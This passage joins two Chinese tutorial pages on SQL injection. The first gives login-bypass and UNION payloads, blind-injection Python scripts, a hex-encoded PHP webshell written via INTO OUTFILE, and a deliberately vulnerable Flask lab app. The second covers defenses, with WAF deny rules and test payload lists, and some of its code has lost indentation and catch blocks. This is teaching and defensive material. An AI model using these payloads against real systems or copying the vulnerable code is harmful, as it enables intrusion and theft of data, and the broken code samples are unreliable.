注释符 `--` 后面的内容被忽略，只验证了 `username = 'admin'`，如果存在 admin 用户，攻击者即可成功登录。

#### 2.1.6 其他 Payload 变体

```
用户名：admin' OR '1'='1' --
密码：任意值
```

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'x'
-- OR '1'='1' 恒为真，等价于返回 users 表全部记录
```

```
用户名：' OR 1=1 --
密码：任意值
```

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'x'
```

```
用户名：admin' UNION SELECT 1,'admin','password' --
密码：任意值
```

```sql
SELECT * FROM users WHERE username = 'admin' UNION SELECT 1,'admin','password' --' AND password = 'x'
-- 前提：users 表为 3 列（id, username, password），且 UNION 结果类型兼容
```

### 2.2 案例 2：UNION 查询获取数据

#### 2.2.1 场景描述

一个商品详情页面，通过 URL 参数 `id` 获取商品信息。

#### 2.2.2 危险代码

```python
# 危险代码：直接拼接用户输入
def get_product(product_id):
    sql = f"SELECT id, name, price FROM products WHERE id = {product_id}"
    cursor.execute(sql)
    return cursor.fetchone()
```

#### 2.2.3 攻击步骤

**步骤 1：确定列数**

```sql
1' ORDER BY 1 -- 
1' ORDER BY 2 -- 
1' ORDER BY 3 -- 
1' ORDER BY 4 --   -- 报错，说明只有 3 列
```

**步骤 2：确定显示位置**

```sql
1' UNION SELECT 1,2,3 -- 
-- 观察页面回显 1、2、3 中的哪一个
```

**步骤 3：获取数据库信息**

```sql
1' UNION SELECT 1,DATABASE(),USER() -- 
```

**步骤 4：获取表名**

```sql
1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- 
```

**步骤 5：获取列名**

```sql
1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 
```

**步骤 6：获取用户数据**

```sql
1' UNION SELECT 1,username,password FROM users -- 
```

### 2.3 案例 3：布尔盲注

#### 2.3.1 场景描述

页面不显示数据库错误，但对不同的输入有不同的响应。

#### 2.3.2 攻击脚本

```python
import requests


def blind_injection(url):
    """布尔盲注：根据页面响应差异猜解数据库名。"""
    # 1. 猜解数据库名长度
    db_name_length = 0
    for i in range(1, 20):
        payload = f"1' AND LENGTH(DATABASE())={i} -- "
        response = requests.get(url, params={"id": payload})
        if "正常" in response.text:
            db_name_length = i
            break
    print(f"数据库名长度：{db_name_length}")

    # 2. 逐字符猜解数据库名
    db_name = ""
    for i in range(1, db_name_length + 1):
        for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
            payload = f"1' AND SUBSTRING(DATABASE(), {i}, 1)='{c}' -- "
            response = requests.get(url, params={"id": payload})
            if "正常" in response.text:
                db_name += c
                break

    print(f"数据库名：{db_name}")
    return db_name
```

### 2.4 案例 4：时间盲注

#### 2.4.1 攻击脚本

```python
import requests
import time


def time_based_injection(url):
    """时间盲注：通过响应延迟猜解数据库名。"""
    # 1. 测试是否存在时间盲注
    start_time = time.time()
    requests.get(url, params={"id": "1' AND SLEEP(5) -- "})
    end_time = time.time()
    if end_time - start_time < 5:
        print("不存在时间盲注")
        return ""
    print("存在时间盲注！")

    # 2. 猜解数据库名
    db_name = ""
    for i in range(1, 20):
        found = False
        for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
            payload = f"1' AND IF(SUBSTRING(DATABASE(), {i}, 1)='{c}', SLEEP(3), 0) -- "
            start_time = time.time()
            requests.get(url, params={"id": payload})
            end_time = time.time()
            if end_time - start_time >= 3:
                db_name += c
                found = True
                print(f"找到第 {i} 个字符：{c}")
                break
        if not found:
            break  # 当前长度已猜完

    print(f"数据库名：{db_name}")
    return db_name
```

### 2.5 案例 5：获取服务器 Shell

#### 2.5.1 前提条件

- MySQL 版本 >= 5.0（information_schema 可用）
- 当前用户具有 FILE 权限
- `secure_file_priv` 未限制，或允许写入 Web 目录
- Web 目录可写，且 MySQL 服务账户有写入权限

#### 2.5.2 攻击步骤

```sql
-- 1. 确认列数后，用 UNION + INTO OUTFILE 写入一句话木马
--    0x3C3F... 是 <?php system($_GET['cmd']); ?> 的十六进制形式，避免引号转义问题
1' UNION SELECT 1,0x3C3F7068702073797374656D28245F4745545B27636D64275D293B3F3E,3 INTO OUTFILE '/var/www/html/shell.php' -- 

-- 2. 若 OUTFILE 不可用，可尝试用堆叠查询配合 SELECT ... INTO OUTFILE
1'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; -- 

-- 说明：INTO OUTFILE 的列数必须与 SELECT 一致；
-- MySQL 5.7+ 默认 secure_file_priv 为 NULL（禁止导出），实际利用前需先探测
```

访问木马：

```
http://target.com/shell.php?cmd=whoami
```

#### 2.5.3 防御措施

- 限制 MySQL 用户的 FILE 权限，业务账号最小权限原则
- 将 `secure_file_priv` 设置为空目录或禁用导出
- Web 目录设置正确的权限，禁止数据库账户写入
- 使用参数化查询，从根源上消除注入

## 3. 本地实验环境搭建

以下内容用于在本地搭建可重复实验的环境，请仅在授权的测试环境（如 DVWA、sqli-labs、自己的虚拟机）中操作。

### 3.1 搭建测试环境

#### 3.1.1 创建测试数据库

```sql
-- 创建数据库
CREATE DATABASE IF NOT EXISTS sqli_test;
USE sqli_test;

-- 创建用户表
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    email VARCHAR(100),
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 插入测试数据
INSERT INTO users (username, password, email, role) VALUES
('admin', 'admin123', 'admin@example.com', 'admin'),
('user1', 'user123', 'user1@example.com', 'user'),
('user2', 'user456', 'user2@example.com', 'user');

-- 创建商品表
CREATE TABLE products (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10, 2) NOT NULL,
    description TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 插入商品测试数据
INSERT INTO products (name, price, description) VALUES
('Product 1', 99.99, 'Description 1'),
('Product 2', 199.99, 'Description 2'),
('Product 3', 299.99, 'Description 3');
```

#### 3.1.2 创建 Vulnerable Web 应用

```python
from flask import Flask, request
import pymysql

app = Flask(__name__)


def get_db_connection():
    return pymysql.connect(
        host='localhost',
        user='root',
        password='password',
        database='sqli_test'
    )


@app.route('/product')
def product():
    product_id = request.args.get('id')
    # 危险代码：直接拼接，存在 SQL 注入
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = f"SELECT * FROM products WHERE id = {product_id}"
    cursor.execute(sql)
    result = cursor.fetchone()
    conn.close()
    return str(result)


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    # 危险代码：直接拼接，存在 SQL 注入
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(sql)
    result = cursor.fetchone()
    conn.close()
    if result:
        return "Login successful!"
    return "Login failed!"


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

### 3.2 攻击演练

启动上面的 Flask 应用后，用 curl 或浏览器模拟攻击：

```bash
# 1. UNION 注入获取数据库名和当前用户
curl "http://localhost:5000/product?id=1%20UNION%20SELECT%201,DATABASE(),USER()--%20"

# 2. 布尔盲注：判断数据库名长度是否为 8（sqli_test 长度为 9，页面应无正常内容）
curl "http://localhost:5000/product?id=1%27%20AND%20LENGTH(DATABASE())=8--%20"

# 3. 登录绕过：admin 用户无需密码
curl -X POST -d "username=admin'-- &password=x" http://localhost:5000/login
```

**预期结果**：

- 第 1 条返回结果中同时出现 `sqli_test` 与当前数据库用户
- 第 2 条条件为假时页面不返回正常商品内容
- 第 3 条返回 `Login successful!`

### 3.3 修复演练

```python
@app.route('/product')
def product_safe():
    product_id = request.args.get('id')
    # 验证输入：只允许纯数字
    if not product_id.isdigit():
        return "Invalid product ID"
    # 使用参数化查询
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = "SELECT * FROM products WHERE id = %s"
    cursor.execute(sql, (product_id,))
    result = cursor.fetchone()
    conn.close()
    return str(result)


@app.route('/login', methods=['POST'])
def login_safe():
    username = request.form.get('username')
    password = request.form.get('password')
    # 使用参数化查询，输入与 SQL 语句分离
    conn = get_db_connection()
    cursor = conn.cursor()
    sql = "SELECT * FROM users WHERE username = %s AND password = %s"
    cursor.execute(sql, (username, password))
    result = cursor.fetchone()
    conn.close()
    if result:
        return "Login successful!"
    return "Login failed!"
```

修复要点：

- 输入校验（`isdigit()`）拦截非数字参数
- 参数化查询让数据库把输入当数据而非 SQL 代码处理
- 完整防御方案（WAF、最小权限、错误信息隐藏等）见 075-SQLInjectionDefenseStrategy

<!-- ============ 文档分隔线：020-mysql/079-SQLInjectionDefenseStrategy.md ============ -->

## 1. SQL 注入防御策略 (Defense Strategies)

### 1.1 核心防御：参数化查询（Prepared Statements）

#### 1.1.1 什么是参数化查询

参数化查询是将 SQL 语句的结构和数据分离的技术。SQL 语句在执行前被预编译，数据作为参数传入，不会被解释为 SQL 代码的一部分。
**工作原理**：

1. 数据库驱动程序发送 SQL 语句结构到数据库服务器
2. 数据库服务器编译并缓存该语句结构
3. 用户输入作为参数绑定到已编译的语句
4. 数据库知道这些值是数据，不会被解释为 SQL 代码

#### 1.1.2 Python (PyMySQL)

```python
 import pymysql
 def safe_login(username, password):
  connection = pymysql.connect(
  host='localhost',
  user='root',
  password='password',
  database='test'
  )
  try:
  cursor = connection.cursor()
  # 使用参数化查询
  sql = "SELECT * FROM users WHERE username = %s AND password = %s"
  # 注意：%s 是占位符，不是字符串格式化
  cursor.execute(sql, (username, password))
  result = cursor.fetchone()
  return result
  finally:
  connection.close()
 # 高级用法：多次执行同一查询
 def batch_insert(users):
  connection = pymysql.connect(host='localhost', user='root', password='password', database='test')
  try:
  cursor = connection.cursor()
  sql = "INSERT INTO users (username, email) VALUES (%s, %s)"
  # 批量插入
  cursor.executemany(sql, users)
  connection.commit()
  finally:
  connection.close()
```

#### 1.1.3 Python (SQLAlchemy ORM)

```python
 from sqlalchemy import create_engine, text
 from sqlalchemy.orm import sessionmaker
 engine = create_engine('mysql+pymysql://root:password@localhost/test')
 Session = sessionmaker(bind=engine)
 # 方式一：使用 text() 和参数
 def safe_login_orm(username, password):
  with engine.connect() as conn:
  sql = text("SELECT * FROM users WHERE username = :username AND password = :password")
  result = conn.execute(sql, {"username": username, "password": password})
  return result.fetchone()
 # 方式二：使用 ORM 查询（更安全、更推荐）
 def safe_login_orm2(username, password):
  session = Session()
  try:
  user = session.query(User).filter(
  User.username == username,
  User.password == password
  ).first()
  return user
  finally:
  session.close()
 # 方式三：使用 filter_by
 def get_user_by_id(user_id):
  session = Session()
  try:
  user = session.query(User).filter_by(id=user_id).first()
  return user
  finally:
  session.close()
```

#### 1.1.4 PHP (PDO)

```php
 <?php
 function safe_login($username, $password) {
  $pdo = new PDO('mysql:host=localhost;dbname=test', 'root', 'password');
  // 使用预处理语句
  $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
  $stmt->execute([$username, $password]);
  return $stmt->fetch();
 }
 // 命名参数方式
 function safe_login2($username, $password) {
  $pdo = new PDO('mysql:host=localhost;dbname=test', 'root', 'password');
  $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
  $stmt->execute([
  ':username' => $username,
  ':password' => $password
  ]);
  return $stmt->fetch();
 }
 // 绑定参数类型
 function safe_insert($username, $email) {
  $pdo = new PDO('mysql:host=localhost;dbname=test', 'root', 'password');
  $stmt = $pdo->prepare("INSERT INTO users (username, email) VALUES (:username, :email)");
  $stmt->bindParam(':username', $username, PDO::PARAM_STR);
  $stmt->bindParam(':email', $email, PDO::PARAM_STR);
  $stmt->execute();
  return $stmt->rowCount();
 }
```

#### 1.1.5 Java (JDBC)

```java
 import java.sql.*;
 public class Login {
  public User safeLogin(String username, String password) throws SQLException {
  String url = "jdbc:mysql://localhost:3306/test";
  Connection conn = DriverManager.getConnection(url, "root", "password");
  // 使用 PreparedStatement
  String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
  PreparedStatement pstmt = conn.prepareStatement(sql);
  pstmt.setString(1, username);
  pstmt.setString(2, password);
  ResultSet rs = pstmt.executeQuery();
  User user = null;
  if (rs.next()) {
  user = new User();
  user.setId(rs.getInt("id"));
  user.setUsername(rs.getString("username"));
  user.setPassword(rs.getString("password"));
  }
  rs.close();
  pstmt.close();
  conn.close();
  return user;
  }
  // 批量插入
  public void batchInsert(List<User> users) throws SQLException {
  String url = "jdbc:mysql://localhost:3306/test";
  Connection conn = DriverManager.getConnection(url, "root", "password");
  String sql = "INSERT INTO users (username, email) VALUES (?, ?)";
  PreparedStatement pstmt = conn.prepareStatement(sql);
  conn.setAutoCommit(false);
  for (User user : users) {
  pstmt.setString(1, user.getUsername());
  pstmt.setString(2, user.getEmail());
  pstmt.addBatch();
  }
  pstmt.executeBatch();
  conn.commit();
  pstmt.close();
  conn.close();
  }
 }
```

#### 1.1.6 Java (MyBatis)

```xml
 <!-- 安全的 XML 映射文件 -->
 <select id="getUser" resultType="User">
  SELECT * FROM users
  WHERE username = #{username} AND password = #{password}
 </select>
 <!-- 注意：
  #{param} 使用参数化查询（安全）
  ${param} 直接拼接字符串（危险）
 <!-- 危险示例 -->
 <select id="getUserDangerous" resultType="User">
  SELECT * FROM users
  WHERE username = ${username} -- 危险！
 </select>
```

```java
 // Java 接口
 public interface UserMapper {
  User getUser(@Param("username") String username, @Param("password") String password);
  List<User> getUsersByIds(@Param("ids") List<Integer> ids);
 }
 // 使用示例
 SqlSession session = sqlSessionFactory.openSession();
 try {
  UserMapper mapper = session.getMapper(UserMapper.class);
  User user = mapper.getUser("admin", "password");
 }
  session.close();
 }
```

### 1.2 使用 ORM 框架

#### 1.2.1 Python (Django ORM)

```python
 from django.contrib.auth.models import User
 # Django ORM 自动使用参数化查询
 def login(request):
  username = request.POST.get('username')
  password = request.POST.get('password')
  # 安全的查询方式
  user = User.objects.filter(username=username, password=password).first()
  return user
 # 更安全的做法：使用 authenticate（推荐）
 from django.contrib.auth import authenticate
 def login(request):
  username = request.POST.get('username')
  password = request.POST.get('password')
  # Django 的 authenticate 会自动处理密码哈希
  user = authenticate(username=username, password=password)
  if user is not None:
  login(request, user)
  return
  return False
 # 使用 Q 对象进行复杂查询
 from django.db.models import Q
 def search_users(query):
  users = User.objects.filter(
  Q(username__icontains=query) | Q(email__icontains=query)
  )
  return users
```

#### 1.2.2 Python (SQLAlchemy)

```python
 from sqlalchemy import Column, Integer, String
 from sqlalchemy.ext.declarative import declarative_base
 Base = declarative_base()
 class User(Base):
  __tablename__ = 'users'
  id = Column(Integer, primary_key=True)
  username = Column(String(50))
  password = Column(String(50))
  email = Column(String(100))
 # 查询
 session = Session()
 user = session.query(User).filter(
  User.username == username,
  User.password == password
 )
 # 使用 filter_by
 user = session.query(User).filter_by(username=username).first()
 # 使用 get
 user = session.query(User).get(user_id)
 # 复杂查询
 from sqlalchemy import and_, or_
 results = session.query(User).filter(
  and_(
  User.username.like('%admin%'),
  or_(User.email.is_(None), User.email != '')
  )
 )
```

#### 1.2.3 Java (JPA/Hibernate)

```java
 import javax.persistence.EntityManager;
 import javax.persistence.PersistenceContext;
 import javax.persistence.Query;
 import org.springframework.stereotype.Repository;
 @Repository
 public class UserRepository {
  @PersistenceContext
  private EntityManager entityManager;
  // 使用 JPQL 参数化查询
  public User findByUsernameAndPassword(String username, String password) {
  String jpql = "SELECT u FROM User u WHERE u.username = :username AND u.password = :password";
  return entityManager.createQuery(jpql, User.class)
  .setParameter("username", username)
  .setParameter("password", password)
  .getSingleResult();
  }
  // 使用命名参数
  public User findByUsername(String username) {
  String jpql = "SELECT u FROM User u WHERE u.username = :username";
  return entityManager.createQuery(jpql, User.class)
  .setParameter("username", username)
  .getSingleResult();
  }
  // 安全的数据更新
  public void updatePassword(Long userId, String newPassword) {
  String jpql = "UPDATE User u SET u.password = :password WHERE u.id = :id";
  entityManager.createQuery(jpql)
  .setParameter("password", newPassword)
  .setParameter("id", userId)
  .executeUpdate();
  }
 }
```

### 1.3 输入验证与过滤

#### 1.3.1 白名单验证

```python
 def safe_get_product(product_id):
  # 白名单验证：只允许数字
  if not product_id.isdigit():
  return None
  # 或者使用正则表达式
  import re
  if not re.match(r'^\d+$', product_id):
  return None
  # 再使用参数化查询
  sql = "SELECT * FROM products WHERE id = %s"
  cursor.execute(sql, (product_id,))
  return cursor.fetchone()
 # 更严格的验证
 def safe_get_user(user_id):
  # 类型检查
  try:
  user_id = int(user_id)
  except (ValueError, TypeError):
  return None
  # 范围检查
  if user_id <= 0 or user_id > 1000000:
  return None
  sql = "SELECT * FROM users WHERE id = %s"
  cursor.execute(sql, (user_id,))
  return cursor.fetchone()
```

#### 1.3.2 类型转换

```python
 def safe_calculate(a, b, operation):
  try:
  a = float(a)
  b = float(b)
  except (ValueError, TypeError):
  return None
  if operation == 'add':
  return a + b
  elif operation == 'subtract':
  return a - b
  elif operation == 'multiply':
  return a * b
  elif operation == 'divide':
  if b == 0:
  return None
  return a / b
  else:
  return None
 def safe_get_user(user_id):
  try:
  user_id = int(user_id)
  except (ValueError, TypeError):
  return None
  sql = "SELECT * FROM users WHERE id = %s"
  cursor.execute(sql, (user_id,))
  return cursor.fetchone()
```

#### 1.3.3 输入长度限制

```python
 def safe_login(username, password):
  # 限制输入长度
  if len(username) > 50 or len(password) > 50:
  return None
  # 去除前后空白
  username = username.strip()
  password = password.strip()
  # 检查是否为空
  if not username or not password:
  return None
  # 再使用参数化查询
  sql = "SELECT * FROM users WHERE username = %s AND password = %s"
  cursor.execute(sql, (username, password))
  return cursor.fetchone()
```

### 1.4 存储过程（谨慎使用）

#### 1.4.1 安全的存储过程

```sql
 DELIMITER //
 CREATE PROCEDURE GetUser(IN p_username VARCHAR(50), IN p_password VARCHAR(50))
 BEGIN
  -- 使用参数，不拼接字符串
  SELECT * FROM users WHERE username = p_username AND password = p_password;
 END //
 DELIMITER ;
 CALL GetUser('admin', '123456');
```

#### 1.4.2 危险的存储过程

```sql
 DELIMITER //
 CREATE PROCEDURE DangerousGetUser(IN p_username VARCHAR(50))
 BEGIN
  SET @sql = CONCAT('SELECT * FROM users WHERE username = ''', p_username, '''');
  PREPARE stmt FROM @sql;
  EXECUTE stmt;
  DEALLOCATE PREPARE stmt;
 END //
 DELIMITER ;
```

### 1.5 权限控制

#### 1.5.1 最小权限原则

```sql
 CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
 GRANT SELECT, INSERT, UPDATE, DELETE ON test_db.* TO 'app_user'@'localhost';
 REVOKE FILE, SUPER, PROCESS ON *.* FROM 'app_user'@'localhost';
 FLUSH PRIVILEGES;
```

#### 1.5.2 权限矩阵

| 权限    | Web 应用用户 | 备份用户 | 管理员用户 |
| :------ | :----------- | :------- | :--------- |
| SELECT  | 需要         | 需要     | 需要       |
| INSERT  | 需要         | 需要     | 需要       |
| UPDATE  | 需要         | 需要     | 需要       |
| DELETE  | 根据需求     | 不需要   | 需要       |
| CREATE  | 不需要       | 不需要   | 需要       |
| DROP    | 不需要       | 不需要   | 需要       |
| FILE    | 不需要       | 不需要   | 不需要     |
| SUPER   | 不需要       | 不需要   | 不需要     |
| PROCESS | 不需要       | 不需要   | 不需要     |

#### 1.5.3 权限建议

- **不要使用 root 用户**运行应用程序
- **创建专用用户**，只授予必要的权限
- **限制用户的访问范围**（特定数据库、特定表）
- **禁止 FILE 权限**（防止读写文件）
- **禁止 SUPER 权限**（防止修改服务器配置）
- **禁止 PROCESS 权限**（防止查看其他连接）

### 1.6 错误信息处理

#### 1.6.1 PHP 错误处理

```php
 <?php
 // 危险：暴露详细错误信息
 mysqli_query($conn, $sql) or die(mysqli_error($conn));
 // 安全：记录错误，返回通用信息
 try {
  mysqli_query($conn, $sql);
 }
  // 记录错误到日志文件
  error_log($e->getMessage());
  // 关闭错误显示
  ini_set('display_errors', 0);
  // 返回通用错误信息
  echo "系统错误，请稍后重试";
 }
 // 生产环境应该这样设置
 ini_set('display_errors', 0);
 error_reporting(E_ALL);
 log_errors = On
 error_log = /var/log/php_errors.log
```

#### 1.6.2 Python 错误处理

```python
 import logging
 # 配置日志
 logging.basicConfig(
  filename='app.log',
  level=logging.ERROR,
  format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 def safe_query(sql, params):
  try:
  cursor.execute(sql, params)
  return cursor.fetchall()
  except Exception as e:
  # 记录详细错误
  logging.error(f"SQL Error: {e}", exc_info=True)
  # 在开发环境可以打印详细错误
  if app.debug:
  print(f"Database Error: {e}")
  # 返回通用错误
  raise Exception("数据库错误，请稍后重试")
 # Flask 示例
 from flask import Flask, jsonify
 import traceback
 app = Flask(__name__)
 @app.errorhandler(500)
 def internal_error(error):
  # 不暴露详细错误信息
  app.logger.error(str(error))
  return jsonify({"error": "Internal server error"}), 500
```

#### 1.6.3 Java 错误处理

```java
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 public class UserDAO {
  private static final Logger logger = LoggerFactory.getLogger(UserDAO.class);
  public User findByUsername(String username) {
  String jpql = "SELECT u FROM User u WHERE u.username = :username";
  try {
  return entityManager.createQuery(jpql, User.class)
  .setParameter("username", username)
  .getSingleResult();
  } catch (NoResultException e) {
  return null;
  } catch (Exception e) {
  // 记录详细错误
  logger.error("Error finding user: " + username, e);
  // 抛出通用异常
  throw new DataAccessException("Database error occurred");
  }
  }
 }
```

### 1.7 Web 应用防火墙（WAF）

#### 1.7.1 WAF 的作用

- 拦截常见的 SQL 注入 Payload
- 提供额外的安全层
- 即使代码存在漏洞，也能提供保护

#### 1.7.2 常见 WAF 产品

| 产品               | 类型      | 特点              |
| :----------------- | :-------- | :---------------- |
| **ModSecurity**    | 开源      | Apache/Nginx 模块 |
| **Cloudflare WAF** | 云服务    | DDoS + WAF        |
| **AWS WAF**        | 云服务    | 与 AWS 集成       |
| **Azure WAF**      | 云服务    | 与 Azure 集成     |
| **FortiWeb**       | 硬件/虚拟 | 企业级            |
| **Imperva**        | 硬件/云   | 高级威胁防护      |

#### 1.7.3 ModSecurity 规则示例

```apache
 # 阻止常见 SQL 注入 Payload
 SecRule ARGS "@rx (union.*select|select.*from|insert.*into|update.*set|delete.*from)" \
  "phase:2,deny,status:403,msg:'SQL Injection Attack'"
 # 阻止单引号
 SecRule ARGS "@rx '" \
  "phase:2,deny,status:403,msg:'Single Quote Detected'"
 # 阻止注释符
 SecRule ARGS "@rx (--|#|/\*)" \
  "phase:2,deny,status:403,msg:'SQL Comment Detected'"
 # 阻止关键字组合
 SecRule ARGS "@rx (?i:(and|or).*[\d\s]*[=<>]|having|union.*select)" \
  "phase:2,deny,status:403,msg:'SQL Injection Pattern'"
```

#### 1.7.4 Cloudflare WAF 规则

```sql
 (http.request.uri.path contains "login" and cf.threat_score > 15)
 (cf.threat_score > 50 and not cf.client.bot)
```

### 1.8 数据库层面防护

#### 1.8.1 启用 SQL 日志

```sql
 SET GLOBAL general_log = 'ON';
 SET GLOBAL general_log_file = '/var/log/mysql/query.log';
 SET GLOBAL log_output = 'TABLE';
 SET GLOBAL general_log = 'ON';
 SET GLOBAL slow_query_log = 'ON';
 SET GLOBAL long_query_time = 1;
 SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';
 SELECT * FROM mysql.general_log;
 SELECT * FROM mysql.slow_log;
```

#### 1.8.2 定期审计

- 定期检查 SQL 日志
- 监控异常查询
- 审计数据库访问
- 监控用户权限变化

#### 1.8.3 数据加密

- **传输加密**：使用 SSL/TLS
- **存储加密**：敏感数据加密存储
- **密码哈希**：使用 bcrypt、Argon2 等强哈希算法

```python
 import bcrypt
 # 密码哈希
 def hash_password(password):
  salt = bcrypt.gensalt()
  hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
  return hashed
 # 密码验证
 def verify_password(password, hashed):
  return bcrypt.checkpw(password.encode('utf-8'), hashed)
 # 使用 argon2
 import argon2
 def hash_password_argon2(password):
  ph = argon2.PasswordHasher()
  return ph.hash(password)
 def verify_password_argon2(password, hashed):
  ph = argon2.PasswordHasher()
  try:
  return ph.verify(hashed, password)
  except argon2.exceptions.VerifyMismatch:
  return False
```

## 2. SQL 注入防御最佳实践 (Best Practices)

### 2.1 开发最佳实践

#### 2.1.1 代码规范

**推荐做法**：

```
 [推荐] 使用参数化查询
 [推荐] 使用 ORM 框架
 [推荐] 输入验证（白名单）
 [推荐] 类型转换
 [推荐] 长度限制
 [推荐] 错误处理
 [推荐] 代码审查
 [推荐] 安全测试
```

**禁止做法**：

```
 [禁止] 直接拼接 SQL
 [禁止] 使用字符串格式化
 [禁止] 信任用户输入
 [禁止] 暴露详细错误
 [禁止] 使用 root 用户
 [禁止] 过度授权
```

#### 2.1.2 安全开发流程

1. **需求阶段**：考虑安全需求
2. **设计阶段**：安全设计，威胁建模
3. **编码阶段**：遵循安全编码规范
4. **测试阶段**：安全测试，包括渗透测试
5. **部署阶段**：安全配置
6. **运维阶段**：安全监控，定期审计

### 2.2 测试最佳实践

#### 2.2.1 安全测试清单

- [ ] 所有输入点测试
- [ ] 参数化查询验证
- [ ] 输入验证测试
- [ ] 权限控制测试
- [ ] 错误信息测试
- [ ] SQLMap 扫描
- [ ] 代码审计
- [ ] 渗透测试

#### 2.2.2 自动化测试

```python
 import pytest
 import requests
 class TestSQLInjection:
  @pytest.fixture
  def base_url(self):
  return "http://example.com"
  def test_login_endpoint(self, base_url):
  """测试登录端点的 SQL 注入"""
  payloads = [
  "' OR '1'='1",
  "' --",
  "1' UNION SELECT 1,2,3 --",
  "1' AND SLEEP(5) --",
  ]
  for payload in payloads:
  response = requests.post(
  f"{base_url}/login",
  data={"username": payload, "password": "test"}
  )
  # 检查是否返回了不应该返回的数据
  assert "管理员" not in response.text
  assert "admin" not in response.text.lower() or response.status_code == 401
  def test_search_endpoint(self, base_url):
  """测试搜索端点"""
  response = requests.get(f"{base_url}/search", params={"q": "' OR 1=1 --"})
  # 验证不会返回所有数据
  assert response.status_code == 400 or len(response.json()) == 0
```

### 2.3 运维最佳实践

#### 2.3.1 服务器配置

- 使用最新版本的 MySQL
- 定期更新补丁
- 启用防火墙
- 配置安全组
- 禁用不必要的功能
- 关闭远程访问（如果不是必需的）

#### 2.3.2 监控与审计

- 启用日志
- 定期备份
- 实时监控
- 定期审计
- 应急响应

#### 2.3.3 安全配置清单

```bash
 # MySQL 安全配置
 # 1. 禁用远程 root 登录
 mysql> DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1');
 # 2. 删除匿名用户
 mysql> DELETE FROM mysql.user WHERE User='';
 # 3. 设置密码策略
 mysql> SET GLOBAL validate_password_policy=STRONG;
 # 4. 限制用户连接
 mysql> CREATE USER 'app'@'localhost' WITH MAX_CONNECTIONS_PER_HOUR 100;
 # 5. 启用审计日志（企业版）
 mysql> INSTALL PLUGIN audit_log SONAME 'audit_log.so';
```

## 3. SQL 注入常见问题 (FAQ)

### Q1：参数化查询能完全防止 SQL 注入吗？

**A**：是的，参数化查询是防止 SQL 注入最有效的方法。但需要注意：

- 不要在参数化查询中拼接表名或列名
- 表名/列名需要使用白名单验证
- 存储过程的参数化也需要注意动态 SQL 的使用

### Q2：使用了 ORM 就一定安全吗？

**A**：不一定。如果 ORM 被错误使用，仍然可能存在 SQL 注入：

```python
 # 危险：使用 raw SQL 拼接
 session.execute(f"SELECT * FROM users WHERE id = {user_id}")
 # 安全：使用 ORM 查询
 session.query(User).filter(User.id == user_id).first()
 # 危险：使用 filter with text
 session.query(User).filter(text(f"id = {user_id}")).first()
```

### Q3：转义单引号能防止 SQL 注入吗？

**A**：不完全能。存在以下绕过方式：

- 宽字节注入
- 二次注入
- 数字类型注入（不需要单引号）
- 字符集问题

### Q4：如何防止表名/列名动态拼接的注入？

**A**：使用白名单验证：

```python
 def safe_query(table_name, column_name, value):
  # 白名单验证
  allowed_tables = ['users', 'products', 'orders']
  allowed_columns = ['id', 'name', 'price']
  if table_name not in allowed_tables:
  raise ValueError("Invalid table name")
  if column_name not in allowed_columns:
  raise ValueError("Invalid column name")
  # 使用参数化查询
  sql = f"SELECT * FROM {table_name} WHERE {column_name} = %s"
  cursor.execute(sql, (value,))
  return cursor.fetchall()
```

### Q5：SQL 注入只存在于 Web 应用吗？

**A**：不是。任何使用数据库且用户输入可控的应用都可能存在 SQL 注入：

- 桌面应用
- 移动应用
- API 服务
- 脚本工具
- 命令行工具

### Q6：如何检测已有的 SQL 注入漏洞？

**A**：可以使用以下方法：

1. 代码审计
2. SQLMap 等自动化工具扫描
3. 手动渗透测试
4. Web 应用安全扫描器

### Q7：云数据库是否还需要担心 SQL 注入？

**A**：是的。云数据库同样面临 SQL 注入风险，因为：

- 应用程序代码可能存在注入漏洞
- 云不等于安全
- 需要在应用层面做好防护

## 4. 总结 (Summary)

### 4.1 核心要点

| 要点             | 说明                               |
| :--------------- | :--------------------------------- |
| **SQL 注入原理** | 用户输入直接拼接到 SQL 语句中      |
| **攻击类型**     | 带内注入、盲注、二次注入、堆叠查询 |
| **核心防御**     | 参数化查询（Prepared Statements）  |
| **辅助防御**     | ORM、输入验证、权限控制、WAF       |
| **最佳实践**     | 最小权限、错误处理、安全测试       |

### 4.2 防御 Checklist

- [ ] 使用参数化查询
- [ ] 使用 ORM 框架
- [ ] 输入验证（白名单）
- [ ] 类型转换
- [ ] 长度限制
- [ ] 最小权限原则
- [ ] 错误信息处理
- [ ] 定期安全测试
- [ ] 代码审计
- [ ] 监控与审计

### 4.3 学习建议

1. **理解原理**：深入理解 SQL 注入的原理和机制
